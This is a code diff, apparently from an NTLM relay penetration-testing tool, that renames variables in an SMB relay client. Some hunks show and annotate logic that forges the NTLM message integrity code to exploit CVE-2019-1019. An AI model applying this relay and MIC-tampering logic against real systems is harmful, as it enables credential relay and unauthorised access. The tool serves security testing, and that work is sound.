@@ -135,9 +135,9 @@ class SMBRelayClient(ProtocolClient):
         self.machineHashes = None
         self.sessionData = {}
 
-        self.negotiate_message = None
-        self.challenge_message = None
-        self.server_challenge = None
+        self.negotiateMessage = None
+        self.challengeMessage = None
+        self.serverChallenge = None
 
         self.keepAliveHits = 1
 
@@ -207,8 +207,7 @@ class SMBRelayClient(ProtocolClient):
         request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
             'user_name'].decode('utf-16le')
         request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
-        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = self.server_challenge
-        import base64
+        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = self.serverChallenge
         request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
         request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']
 
@@ -316,12 +315,12 @@ class SMBRelayClient(ProtocolClient):
         else:
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
 
-        self.negotiate_message = negotiateMessage
-        self.challenge_message = challenge.getData()
+        self.negotiateMessage = negotiateMessage
+        self.challengeMessage = challenge.getData()
 
         # Store the Challenge in our session data dict. It will be used by the SMB Proxy
         self.sessionData['CHALLENGE_MESSAGE'] = challenge
-        self.server_challenge = challenge['challenge']
+        self.serverChallenge = challenge['challenge']
 
         return challenge
 
@@ -475,6 +474,8 @@ class SMBRelayClient(ProtocolClient):
 
         signingKey = None
         if self.serverConfig.remove_target:
+            # Trying to exploit CVE-2019-1019
+            # Discovery and Implementation by @simakov_marina
             respToken2 = SPNEGO_NegTokenResp(authData)
             authenticateMessageBlob = respToken2['ResponseToken']
 
@@ -484,8 +485,8 @@ class SMBRelayClient(ProtocolClient):
             res = NTLMAuthChallengeResponse()
             res.fromString(authenticateMessageBlob)
 
-            new_auth_blob = authenticateMessageBlob[0:0x48] + b'\x00'*16 + authenticateMessageBlob[0x58:]
-            relay_MIC = hmac_md5(signingKey, self.negotiate_message + self.challenge_message + new_auth_blob)
+            newAuthBlob = authenticateMessageBlob[0:0x48] + b'\x00'*16 + authenticateMessageBlob[0x58:]
+            relay_MIC = hmac_md5(signingKey, self.negotiateMessage + self.challengeMessage + newAuthBlob)
 
             respToken2 = SPNEGO_NegTokenResp()
             respToken2['ResponseToken'] = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
